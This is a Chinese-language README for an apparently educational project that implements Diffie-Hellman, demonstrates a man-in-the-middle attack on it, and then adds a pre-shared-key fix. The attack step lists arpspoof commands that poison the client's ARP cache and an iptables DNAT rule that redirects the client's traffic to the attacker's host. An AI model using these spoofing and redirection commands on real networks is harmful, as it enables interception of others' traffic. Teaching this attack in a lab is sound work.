# Diffie-Hellman
Diffie-Hellman协议实现以及改进（中间人攻击）

编译：`make`

-   Step1. 客户端服务器通信

    服务器运行 `./server [server_ip]`

    客户端运行 `./client [server_ip] [client_ip]` ，这里客户端也绑定一下ip是为了后面测试方便

-   Step2. 中间人攻击

    中间人运行 `echo 1 >/proc/sys/net/ipv4/ip_forward` 开启IP转发

    `arpspoof -i [mid_nic_name] -t [client_ip] [gateway_ip]` 欺骗网关

    `arpspoof -i [mid_nic_name] -t [client_ip] [server_ip]`欺骗服务器

    客户端运行`iptables -t nat -A PREROUTING -p tcp -s [client_ip] -d [server_ip] -j DNAT --to [mid_ip]`

    服务器运行 `./server [server_ip]`

    中间人运行 `./mid [mid_ip] [server_ip]`

    客户端运行 `./client [server_ip] [client_ip]`

-   Step3. 预共享密钥改进

    别的不变，改成 `server-pro` 和 `client-pro` 就行了

以上是单向的，即客户端->(中间人)->服务器，没加服务器对客户端的回应，要加的话把注释去掉加调用改改就行了